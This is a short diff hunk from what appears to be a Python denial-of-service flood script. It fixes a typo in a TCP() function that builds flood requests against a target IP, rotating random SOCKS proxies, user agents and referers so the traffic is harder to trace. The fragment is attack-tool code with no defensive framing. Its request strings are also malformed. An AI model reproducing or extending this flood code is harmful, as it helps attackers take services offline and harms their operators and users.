@@ -315,7 +315,7 @@ def TCP():
   global time
   Socks = random.choice(socks2)
   useralive = "UserAgents: "+random.choice(useragents)+random.choice(ref)+random.choice(socks2)+"\r\n"
-  reffer = ranfom.choice(ref)
+  reffer = random.choice(ref)
   get_rand = random.choice(['GET','POST',"HEAD"])
   get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
   byte_ip = get_host + useralive + reffer + Socks + get_rand + "\r\n"
